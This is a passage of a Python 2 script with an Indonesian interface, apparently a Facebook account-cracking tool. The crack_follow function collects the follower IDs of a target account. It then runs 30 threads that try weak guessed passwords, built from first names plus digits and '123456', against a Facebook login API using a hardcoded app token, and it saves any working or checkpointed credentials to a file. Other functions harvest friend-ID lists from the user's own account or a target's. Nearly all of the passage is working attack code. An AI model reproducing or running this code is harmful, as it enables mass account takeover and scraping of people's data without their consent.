    os.system('python2 Crackv1.py')


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print ' '
    print '\x1b[0;95m  _____     _ _  '
    print '\x1b[0;95m |  ___|__ | | | _____      __ \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[0;95m | |_ / _ \\| | |/ _ \\ \\ /\\ / / \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[0;95m |  _| (_) | | | (_) \\ V  V /  \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[0;95m |_|  \\___/|_|_|\\___/ \\_/\\_/  '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '              \x1b[1;94m>>> \x1b[1;93mCRACK FOLLOWERS \x1b[1;94m<<<'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mID Publik \x1b[1;91m:\x1b[1;97m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama Akun \x1b[1;91m:\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik tidak ada !'
        raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/follow.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/follow.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/follow.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/follow.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/follow.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/follow.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/follow.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/follow.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/follow.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/follow.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/follow.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/follow.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone follow.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def user_id():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mUsername Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Username : ')
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
    menu()


def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Token invalid '
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        menu()

    os.system('clear')
    print logo2
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mDump Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[0;94m(\x1b[0;97m1\x1b[0;94m)\x1b[0;97m Ambil ID Dari Daftar Teman '
    print '\x1b[0;94m(\x1b[0;97m2\x1b[0;94m) \x1b[0;97mAmbil ID Dari Teman/Publik '
    print '\x1b[0;94m(\x1b[0;91m0\x1b[0;94m) \x1b[0;97mKembali '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Pilih \x1b[0;94m> \x1b[0;97m ')
    if cuih == '':
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Isi Yg Benar Sayang!'
        dump_pilih()
    elif cuih == '1' or cuih == '01':
        id_teman()
    elif cuih == '2' or cuih == '02':
        idfrom_teman()
    elif cuih == '0' or cuih == '00':
        menu()
    else:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Isi Yg Benar Sayang!'
        dump_pilih()


def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo2
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mDump Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Mengambil semua ID Teman \x1b[0;97m...')
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[0;97m(\x1b[0;93m' + str(len(idteman)) + '\x1b[0;97m)\x1b[0;94m > ',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m' + a['id']

        bz.close()
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\r\x1b[0;97m(\x1b[0;92m\xe2\x9c\x93\x1b[0;97m) \x1b[0;97mSukses Mengambil ID \x1b[0;97m....'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mTotal ID\x1b[0;91m :\x1b[0;97m %s' % len(idteman)
        done = raw_input('\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Simpan Nama File\x1b[0;91m : \x1b[0;97m')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) File tersimpan \x1b[0;91m: \x1b[0;97mout/' + done
        print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        raw_input('\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 Crackv1.py')
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Gagal membuat file'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Terhenti ! '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except KeyError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Gagal !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except OSError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) File anda tidak tersimpan !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 Crackv1.py')
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Tidak ada koneksi !'
        keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo2
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mDump Id\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        idt = raw_input('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Nama Akun      : ' + op['name']
        except KeyError:
            print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) ID Publik Tidak Ada !'
            raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mMengambil Semua ID ...')
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
